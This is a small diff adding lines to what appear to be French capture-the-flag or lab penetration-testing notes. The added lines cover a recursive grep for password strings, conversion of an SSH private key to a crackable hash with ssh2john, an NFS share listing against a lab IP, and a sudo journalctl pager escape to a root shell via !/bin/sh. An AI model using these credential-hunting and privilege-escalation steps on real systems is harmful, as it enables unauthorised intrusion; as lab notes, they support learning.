@@ -16,6 +16,22 @@ mysql --host=localhost --user=drupaluser --password=\*\*\*\* drupal -e "select \
 
 
 
+grep -r -l "pass" --color=auto
+
+
+
+ssh2john.py id\_rsa\_jo > id\_hash
+
+
+
+showmont -t 10.10.10.180
+
+
+
+Le script utiliser sudo sur journalctl. Relancer la commmande avec un écran plus petit et à la place de q pour quitter !/bin/sh
+
+
+
 
 
 
